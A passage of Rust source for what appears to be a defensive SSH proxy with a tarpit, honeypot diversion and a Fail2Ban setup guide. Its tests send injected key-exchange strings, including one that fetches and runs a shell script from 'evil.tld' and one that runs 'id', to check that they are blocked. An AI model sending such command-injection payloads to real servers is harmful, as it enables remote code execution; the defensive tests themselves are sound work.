            .fetch_add(1, Ordering::Relaxed);
        return Err(format!(
            "sigil-filter flagged SSH_MSG_DEBUG ({violation:?}, confidence={:.2})",
            res.confidence
        ));
    }
    Ok(())
}

async fn splice_to_upstream_sshd(
    mut client_stream: TcpStream,
    upstream_addr: SocketAddr,
    replay_prefix: Option<&[u8]>,
) -> io::Result<()> {
    let mut upstream = TcpStream::connect(upstream_addr).await?;
    let _ = upstream.set_nodelay(true);
    if let Some(prefix) = replay_prefix {
        upstream.write_all(prefix).await?;
        upstream.flush().await?;
    }
    let _ = tokio::io::copy_bidirectional(&mut client_stream, &mut upstream).await;
    Ok(())
}

async fn run_endlessh_tarpit(
    mut stream: TcpStream,
    engine: &Arc<MirageEngine>,
    persona: &Arc<PrebakedPersona>,
    client_ip: IpAddr,
    client_banner: &str,
) -> io::Result<()> {
    let Some(_permit) = engine.try_acquire_tarpit() else {
        return Ok(());
    };

    engine.record_event(
        client_ip,
        persona,
        "SSH-TARPIT",
        "EndlesshPreBannerTrap",
        format!(
            "Trapped banner '{}' in slow pre-banner drip loop",
            client_banner
        ),
    );

    let interval_ms = engine.config().ssh.endlessh_drip_interval_ms.max(250);
    let mut counter = 0u64;

    loop {
        counter += 1;
        let line = format!(
            "OpenSSH-PreAuth-Node-{}: sync-seq={:08x}\r\n",
            persona.hostname, counter
        );
        stream.write_all(line.as_bytes()).await?;
        stream.flush().await?;
        engine
            .metrics
            .tarpit_bytes_dripped
            .fetch_add(line.len() as u64, Ordering::Relaxed);
        tokio::time::sleep(Duration::from_millis(interval_ms)).await;
    }
}

async fn read_ssh_line<R: AsyncRead + Unpin>(stream: &mut R, max_len: usize) -> io::Result<String> {
    let mut buf = Vec::with_capacity(128);
    let mut byte = [0u8; 1];
    while buf.len() <= max_len {
        let n = stream.read(&mut byte).await?;
        if n == 0 {
            break;
        }
        if byte[0] == b'\n' {
            break;
        }
        if byte[0] != b'\r' {
            buf.push(byte[0]);
        }
    }
    Ok(String::from_utf8_lossy(&buf).into_owned())
}

/// Print OpenSSH daemon & optional Fail2Ban filter setup instructions.
pub fn generate_openssh_proxy_guide(bind_addr: SocketAddr, upstream_addr: SocketAddr) -> String {
    format!(
        r#"# ============================================================================
# Mirage Frontline OpenSSH Reverse Proxy & Pre-Auth CVE Shield Setup
# ============================================================================
# 1. Move real OpenSSH `sshd` to loopback port {upstream_port}:
#    # /etc/ssh/sshd_config.d/99-mirage-upstream.conf
#    ListenAddress {upstream_addr}
#
#    sudo sshd -t && sudo systemctl reload ssh
#
# 2. Run Mirage Frontline SSH Shield on public port {bind_port}:
#    mirage-daemon --bind {bind_addr} --upstream-sshd {upstream_addr} \
#      --bruteforce-action fail2ban --cve-action ssh-honeypot --scanner-action endlessh-tarpit
#
# 3. Optional host-level Fail2Ban / nftables sync (when `ban_log_file = "/var/log/mirage-bans.log"`):
#    # /etc/fail2ban/filter.d/mirage-ssh.conf
#    [Definition]
#    failregex = ^ts=\d+ MIRAGE_BAN client_ip=<HOST> category=.*$
#    ignoreregex =
"#,
        upstream_port = upstream_addr.port(),
        bind_port = bind_addr.port(),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use mirage_deception::MirageConfig;

    fn build_unencrypted_packet(payload: &[u8]) -> Vec<u8> {
        let block_size = 8usize;
        let unpadded = 4 + 1 + payload.len();
        let mut pad_len = block_size - (unpadded % block_size);
        if pad_len < 4 {
            pad_len += block_size;
        }
        let pkt_len = 1 + payload.len() + pad_len;
        let mut out = Vec::with_capacity(4 + pkt_len);
        out.extend_from_slice(&(pkt_len as u32).to_be_bytes());
        out.push(pad_len as u8);
        out.extend_from_slice(payload);
        out.resize(4 + pkt_len, 0xaa);
        out
    }

    fn build_kexinit_payload(kex_algos: &str) -> Vec<u8> {
        let mut p = Vec::new();
        p.push(SSH_MSG_KEXINIT);
        p.extend_from_slice(&[0x11u8; 16]);
        let lists = [
            kex_algos,
            "ssh-ed25519",
            "aes128-ctr",
            "aes128-ctr",
            "hmac-sha2-256",
            "hmac-sha2-256",
            "none",
            "none",
            "",
            "",
        ];
        for l in lists {
            p.extend_from_slice(&(l.len() as u32).to_be_bytes());
            p.extend_from_slice(l.as_bytes());
        }
        p.push(0);
        p.extend_from_slice(&0u32.to_be_bytes());
        p
    }

    #[tokio::test]
    async fn test_frontline_proxy_relays_clean_kex_and_newkeys_with_cached_banner() {
        let mock_sshd = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let mock_sshd_addr = mock_sshd.local_addr().unwrap();

        tokio::spawn(async move {
            let (mut s, _) = mock_sshd.accept().await.unwrap();
            let c_banner = read_ssh_line(&mut s, 255).await.unwrap();
            assert_eq!(c_banner, "SSH-2.0-OpenSSH_9.6p1");
            s.write_all(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10\r\n")
                .await
                .unwrap();

            let server_kex = build_unencrypted_packet(&build_kexinit_payload("curve25519-sha256"));
            s.write_all(&server_kex).await.unwrap();

            let (_raw, c_kex_payload) = read_raw_ssh_packet(&mut s, 35000).await.unwrap();
            assert_eq!(c_kex_payload[0], SSH_MSG_KEXINIT);

            let (_raw_nk, c_nk) = read_raw_ssh_packet(&mut s, 35000).await.unwrap();
            assert_eq!(c_nk[0], SSH_MSG_NEWKEYS);

            s.write_all(&build_unencrypted_packet(&[SSH_MSG_NEWKEYS]))
                .await
                .unwrap();
        });

        let mut cfg = MirageConfig::default();
        cfg.ssh.upstream_sshd_addr = mock_sshd_addr;
        let engine = MirageEngine::new(cfg);
        engine.set_upstream_banner("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10".to_string());

        let proxy_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let proxy_addr = proxy_listener.local_addr().unwrap();
        let eng_clone = engine.clone();
        tokio::spawn(async move {
            let _ = serve_ssh_listener(proxy_listener, eng_clone).await;
        });

        let mut client = TcpStream::connect(proxy_addr).await.unwrap();
        let s_banner = read_ssh_line(&mut client, 255).await.unwrap();
        assert_eq!(s_banner, "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10");

        client
            .write_all(b"SSH-2.0-OpenSSH_9.6p1\r\n")
            .await
            .unwrap();
        client
            .write_all(&build_unencrypted_packet(&build_kexinit_payload(
                "curve25519-sha256",
            )))
            .await
            .unwrap();

        let (_raw_sk, sk_payload) = read_raw_ssh_packet(&mut client, 35000).await.unwrap();
        assert_eq!(sk_payload[0], SSH_MSG_KEXINIT);

        client
            .write_all(&build_unencrypted_packet(&[SSH_MSG_NEWKEYS]))
            .await
            .unwrap();

        let (_raw_snk, snk_payload) = read_raw_ssh_packet(&mut client, 35000).await.unwrap();
        assert_eq!(snk_payload[0], SSH_MSG_NEWKEYS);

        tokio::time::sleep(Duration::from_millis(20)).await;
        assert_eq!(engine.metrics_snapshot().ssh_proxied_to_upstream, 1);
        assert_eq!(engine.metrics_snapshot().ssh_blocked_preauth, 0);
    }

    #[tokio::test]
    async fn test_recent_ssh_cve_vectors_blocked_before_upstream() {
        let engine = MirageEngine::new(MirageConfig::default());

        let mut seen = false;
        assert!(inspect_preauth_client_payload(&[SSH2_MSG_PING, 0, 0, 0, 4], &engine, false, &mut seen).is_err());

        let mut seen = false;
        assert!(inspect_preauth_client_payload(&[SSH_MSG_IGNORE, 0, 0, 0, 0], &engine, true, &mut seen).is_err());

        let mut seen = false;
        assert!(inspect_preauth_client_payload(&[52], &engine, true, &mut seen).is_err());

        let mut seen = false;
        let clean = build_kexinit_payload("curve25519-sha256,ecdh-sha2-nistp256");
        assert!(inspect_preauth_client_payload(&clean, &engine, true, &mut seen).is_ok());
        assert!(inspect_preauth_client_payload(&clean, &engine, false, &mut seen).is_err());

        let mut seen = false;
        let evil = build_kexinit_payload("curve25519-sha256,$(curl http://evil.tld/p.sh|sh)");
        assert!(inspect_preauth_client_payload(&evil, &engine, true, &mut seen).is_err());
        assert!(engine.metrics_snapshot().sigil_detections >= 1);
    }

    #[tokio::test]
    async fn test_seamless_mid_handshake_diversion_into_honeypot_zero_upstream_touch() {
        let mut cfg = MirageConfig::default();
        cfg.ssh.upstream_sshd_addr = "127.0.0.1:1".parse().unwrap();
        cfg.ssh.cve_exploit_action = ResponseAction::SshHoneypot;
        let engine = MirageEngine::new(cfg);
        engine.set_upstream_banner("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10".to_string());

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let eng_server = engine.clone();
        tokio::spawn(async move {
            let _ = serve_ssh_listener(listener, eng_server).await;
        });

        let mut attacker = TcpStream::connect(addr).await.unwrap();
        let s_banner = read_ssh_line(&mut attacker, 255).await.unwrap();
        assert_eq!(s_banner, "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10");

        attacker
            .write_all(b"SSH-2.0-OpenSSH_9.6p1\r\n")
            .await
            .unwrap();
        let evil_kex = build_kexinit_payload("curve25519-sha256,$(id)");
        attacker
            .write_all(&build_unencrypted_packet(&evil_kex))
            .await
            .unwrap();

        let (_raw, honeypot_kex) = read_raw_ssh_packet(&mut attacker, 35000).await.unwrap();
        assert_eq!(honeypot_kex[0], SSH_MSG_KEXINIT);
        assert_eq!(engine.metrics_snapshot().ssh_blocked_preauth, 1);
        assert_eq!(engine.metrics_snapshot().ssh_diverted_honeypot, 1);
        assert_eq!(engine.metrics_snapshot().ssh_proxied_to_upstream, 0);
    }

    #[tokio::test]
    async fn test_configurable_fail2ban_drops_bruteforce_while_scanner_hits_endlessh() {
        let mut cfg = MirageConfig::default();
        cfg.ssh.bruteforce_action = ResponseAction::Fail2ban;
        cfg.ssh.scanner_action = ResponseAction::EndlesshTarpit;
        cfg.ssh.endlessh_drip_interval_ms = 50;
        let engine = MirageEngine::new(cfg);

        // 1. Flag 127.0.0.1 as BruteForce -> Fail2ban immediately closes TCP with 0 bytes sent
        engine.flag_hostile_ip(
            "127.0.0.1".parse().unwrap(),
            ThreatCategory::BruteForce,
            "test_bruteforce",
        );

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let eng_server = engine.clone();
        tokio::spawn(async move {
            let _ = serve_ssh_listener(listener, eng_server).await;
        });

        let mut banned = TcpStream::connect(addr).await.unwrap();
        let mut buf = [0u8; 32];
        let n = banned.read(&mut buf).await.unwrap();
        assert_eq!(n, 0); // Instant 0-CPU drop!
        assert_eq!(engine.metrics_snapshot().ssh_banned_fail2ban, 1);
    }

    #[tokio::test]
    async fn test_endlessh_tarpit_traps_scanner_banner_without_touching_upstream() {
        let mut cfg = MirageConfig::default();
        cfg.ssh.scanner_action = ResponseAction::EndlesshTarpit;
        cfg.ssh.endlessh_drip_interval_ms = 50;
        let engine = MirageEngine::new(cfg);

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let eng_server = engine.clone();
        tokio::spawn(async move {
            let _ = serve_ssh_listener(listener, eng_server).await;
        });

        let mut scanner = TcpStream::connect(addr).await.unwrap();
        scanner
            .write_all(b"SSH-2.0-libssh2_1.10.0\r\n")
            .await
            .unwrap();

        let line1 = read_ssh_line(&mut scanner, 255).await.unwrap();
        assert!(line1.starts_with("OpenSSH-PreAuth-Node-"));
        assert!(!line1.starts_with("SSH-2.0-"));
        assert_eq!(engine.metrics_snapshot().ssh_blocked_preauth, 1);
    }
}
